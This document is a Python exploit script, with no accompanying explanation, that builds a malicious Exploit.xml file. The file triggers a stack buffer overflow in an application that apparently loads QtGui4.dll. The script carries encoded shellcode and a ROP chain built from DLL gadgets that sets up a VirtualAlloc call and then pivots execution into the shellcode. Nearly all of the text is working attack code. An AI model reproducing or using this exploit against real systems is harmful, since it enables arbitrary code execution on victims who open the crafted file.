import os,struct

offset = 1536
total = 5000  # change me

shellcode =  b""
shellcode += b"\xba\x80\xf9\x51\x24\xda\xc9\xd9\x74\x24\xf4"
shellcode += b"\x5e\x29\xc9\xb1\x52\x31\x56\x12\x83\xc6\x04"
shellcode += b"\x03\xd6\xf7\xb3\xd1\x2a\xef\xb6\x1a\xd2\xf0"
shellcode += b"\xd6\x93\x37\xc1\xd6\xc0\x3c\x72\xe7\x83\x10"
shellcode += b"\x7f\x8c\xc6\x80\xf4\xe0\xce\xa7\xbd\x4f\x29"
shellcode += b"\x86\x3e\xe3\x09\x89\xbc\xfe\x5d\x69\xfc\x30"
shellcode += b"\x90\x68\x39\x2c\x59\x38\x92\x3a\xcc\xac\x97"
shellcode += b"\x77\xcd\x47\xeb\x96\x55\xb4\xbc\x99\x74\x6b"
shellcode += b"\xb6\xc3\x56\x8a\x1b\x78\xdf\x94\x78\x45\xa9"
shellcode += b"\x2f\x4a\x31\x28\xf9\x82\xba\x87\xc4\x2a\x49"
shellcode += b"\xd9\x01\x8c\xb2\xac\x7b\xee\x4f\xb7\xb8\x8c"
shellcode += b"\x8b\x32\x5a\x36\x5f\xe4\x86\xc6\x8c\x73\x4d"
shellcode += b"\xc4\x79\xf7\x09\xc9\x7c\xd4\x22\xf5\xf5\xdb"
shellcode += b"\xe4\x7f\x4d\xf8\x20\xdb\x15\x61\x71\x81\xf8"
shellcode += b"\x9e\x61\x6a\xa4\x3a\xea\x87\xb1\x36\xb1\xcf"
shellcode += b"\x76\x7b\x49\x10\x11\x0c\x3a\x22\xbe\xa6\xd4"
shellcode += b"\x0e\x37\x61\x23\x70\x62\xd5\xbb\x8f\x8d\x26"
shellcode += b"\x92\x4b\xd9\x76\x8c\x7a\x62\x1d\x4c\x82\xb7"
shellcode += b"\xb2\x1c\x2c\x68\x73\xcc\x8c\xd8\x1b\x06\x03"
shellcode += b"\x06\x3b\x29\xc9\x2f\xd6\xd0\x9a\x8f\x8f\xa8"
shellcode += b"\xc0\x78\xd2\x4c\xc5\x41\x5b\xaa\x4f\xa2\x0d"
shellcode += b"\x65\xf8\x5b\x14\xfd\x99\xa4\x82\x78\x99\x2f"
shellcode += b"\x21\x7d\x54\xd8\x4c\x6d\x01\x28\x1b\xcf\x84"
shellcode += b"\x37\xb1\x67\x4a\xa5\x5e\x77\x05\xd6\xc8\x20"
shellcode += b"\x42\x28\x01\xa4\x7e\x13\xbb\xda\x82\xc5\x84"
shellcode += b"\x5e\x59\x36\x0a\x5f\x2c\x02\x28\x4f\xe8\x8b"
shellcode += b"\x74\x3b\xa4\xdd\x22\x95\x02\xb4\x84\x4f\xdd"
shellcode += b"\x6b\x4f\x07\x98\x47\x50\x51\xa5\x8d\x26\xbd"
shellcode += b"\x14\x78\x7f\xc2\x99\xec\x77\xbb\xc7\x8c\x78"
shellcode += b"\x16\x4c\xb2\x89\xaa\x59\x23\x30\x5f\x20\x29"
shellcode += b"\xc3\x8a\x67\x54\x40\x3e\x18\xa3\x58\x4b\x1d"
shellcode += b"\xef\xde\xa0\x6f\x60\x8b\xc6\xdc\x81\x9e"
shellcode += b"\x90" * (500 - len(shellcode))
#\x00\x27

#6528119C - virtualAllocexStub
rop_nop = struct.pack("<I",0x65010129)

rop = struct.pack("<I",0x650e0cc8)  # push esp; pop esi; ret 4; 
rop += rop_nop
rop += rop_nop
rop += struct.pack("<I",0x65010fe3)  # mov eax, esi; pop esi; ret;
rop += struct.pack("<I",0x41414141)  # padding for pop esi

rop += struct.pack("<I",0x6505c1cb)  # add esp, 0x1c; ret; 

rop += struct.pack("<L", 0x6528119C) # dummy VirutalAlloc Address (pointer to VirtualProtect) 
rop += struct.pack("<L", 0x55555555) # Shellcode Return Address (pointer to shellcode address)
rop += struct.pack("<L", 0x44444444) # # dummy Shellcode Address  (pointer to shellcode address)
rop += struct.pack("<L", 0x33333333) # dummy dwSize  - 0x1
rop += struct.pack("<L", 0x22222222) # # dummy flAllocationType  - 0x1000
rop += struct.pack("<L", 0x11111111) # dummy flProtect - 0x40

rop += b"\x90" * 4 # padding

#1st step, patching VirtualAlloc
rop += struct.pack("<L", 0x6508cc4e)  # add eax, 0x10; ret;
rop += struct.pack("<L", 0x65012c97)  # inc eax; ret; 
rop += struct.pack("<L", 0x65012c97)  # inc eax; ret; 
rop += struct.pack("<L", 0x65012c97)  # inc eax; ret; 
rop += struct.pack("<L", 0x65012c97)  # inc eax; ret; 
rop += struct.pack("<I",0x6511930e)  # mov ecx, eax; mov eax, ecx; ret; 
rop += struct.pack("<L", 0x6501e9b9)  # mov eax, dword ptr [eax]; ret;  :: ../dll/QtGui4.dll
rop += struct.pack("<L", 0x6501e9b9)  # mov eax, dword ptr [eax]; ret;  :: ../dll/QtGui4.dll
rop += struct.pack("<L", 0x6501a15e)  # pop edi; ret; 
rop += struct.pack("<L", 0xfffe42d0)  # -1bd30
rop += struct.pack("<L", 0x651e76db)  # add eax, edi; pop edi; pop esi; ret; 
rop += struct.pack("<I",0x41414141)  # padding for pop esi
rop += struct.pack("<I",0x41414141)  # padding for pop esi
rop += struct.pack("<L", 0x65030798)  # mov dword ptr [ecx], eax; ret;  :: ../dll/QtGui4.dll

#2nd step - Shellcode Return Address
rop += struct.pack("<L", 0x6502475c)  # mov eax, ecx; ret; 
rop += struct.pack("<L", 0x651611f8)  # inc ecx; ret;  :: ../dll/QtGui4.dll
rop += struct.pack("<L", 0x651611f8)  # inc ecx; ret;  :: ../dll/QtGui4.dll
rop += struct.pack("<L", 0x651611f8)  # inc ecx; ret;  :: ../dll/QtGui4.dll
rop += struct.pack("<L", 0x651611f8)  # inc ecx; ret;  :: ../dll/QtGui4.dll
rop += struct.pack("<L", 0x65010ce3)  # pop ebp; ret; 
rop += struct.pack("<L", 0xfffffcfc)
rop += struct.pack("<L", 0x6502cf91)  # sub eax, ebp; ret; 
rop += struct.pack("<L", 0x65030798)  # mov dword ptr [ecx], eax; ret;  :: ../dll/QtGui4.dll

#3rd step - Shellcode Address
rop += struct.pack("<L", 0x651611f8)  # inc ecx; ret;  :: ../dll/QtGui4.dll
rop += struct.pack("<L", 0x651611f8)  # inc ecx; ret;  :: ../dll/QtGui4.dll
rop += struct.pack("<L", 0x651611f8)  # inc ecx; ret;  :: ../dll/QtGui4.dll
rop += struct.pack("<L", 0x651611f8)  # inc ecx; ret;  :: ../dll/QtGui4.dll
rop += struct.pack("<L", 0x65030798)  # mov dword ptr [ecx], eax; ret;  :: ../dll/QtGui4.dll

#dwSize - 0x1
rop += struct.pack("<L", 0x651611f8)  # inc ecx; ret;  :: ../dll/QtGui4.dll
rop += struct.pack("<L", 0x651611f8)  # inc ecx; ret;  :: ../dll/QtGui4.dll
rop += struct.pack("<L", 0x651611f8)  # inc ecx; ret;  :: ../dll/QtGui4.dll
rop += struct.pack("<L", 0x651611f8)  # inc ecx; ret;  :: ../dll/QtGui4.dll
rop += struct.pack("<L", 0x65017b47)  # pop eax; ret; 
rop += struct.pack("<L", 0xffffffff)  # -1
rop += struct.pack("<L", 0x65029047)  # neg eax; ret;  :: ../dll/QtGui4.dll
rop += struct.pack("<L", 0x65030798)  # mov dword ptr [ecx], eax; ret;  :: ../dll/QtGui4.dll

#flAllocation - 0x1000
rop += struct.pack("<L", 0x651611f8)  # inc ecx; ret;  :: ../dll/QtGui4.dll
rop += struct.pack("<L", 0x651611f8)  # inc ecx; ret;  :: ../dll/QtGui4.dll
rop += struct.pack("<L", 0x651611f8)  # inc ecx; ret;  :: ../dll/QtGui4.dll
rop += struct.pack("<L", 0x651611f8)  # inc ecx; ret;  :: ../dll/QtGui4.dll
rop += struct.pack("<L", 0x65017b47)  # pop eax; ret; 
rop += struct.pack("<L", 0xffffefff)  # -1001
rop += struct.pack("<L", 0x65029047)  # neg eax; ret;  :: ../dll/QtGui4.dll
rop += struct.pack("<L", 0x6501ead7)  # dec eax; ret; 
rop += struct.pack("<L", 0x65030798)  # mov dword ptr [ecx], eax; ret;  :: ../dll/QtGui4.dll

#flProtect
rop += struct.pack("<L", 0x651611f8)  # inc ecx; ret;  :: ../dll/QtGui4.dll
rop += struct.pack("<L", 0x651611f8)  # inc ecx; ret;  :: ../dll/QtGui4.dll
rop += struct.pack("<L", 0x651611f8)  # inc ecx; ret;  :: ../dll/QtGui4.dll
rop += struct.pack("<L", 0x651611f8)  # inc ecx; ret;  :: ../dll/QtGui4.dll
rop += struct.pack("<L", 0x65017b47)  # pop eax; ret; 
rop += struct.pack("<L", 0xffffffc0)  # -1
rop += struct.pack("<L", 0x65029047)  # neg eax; ret;  :: ../dll/QtGui4.dll
rop += struct.pack("<L", 0x65030798)  # mov dword ptr [ecx], eax; ret;  :: ../dll/QtGui4.dll

#return to shellcode
rop += struct.pack("<L", 0x6502475c)  # mov eax, ecx; ret; 
rop += struct.pack("<L", 0x6524f721)  # sub eax, 0x14; ret; 
rop += struct.pack("<L", 0x6503a936)  # xchg eax, esp; ret;  :: ../dll/QtGui4.dll

print(800 - len(rop))
rop += b"\x90" * (800 - len(rop))

payload = b"A" * offset
payload += rop_nop
payload += b"\x90" * 16 # padding
payload += rop
payload += shellcode
payload += b"C" * (total - len(payload))

#FILE
file=b'<?xml version="1.0" encoding="UTF-8"?>\n<classify\nname=\'' + payload + b'\n</classify>'

f = open('Exploit.xml', 'wb')
f.write(file)
f.close()
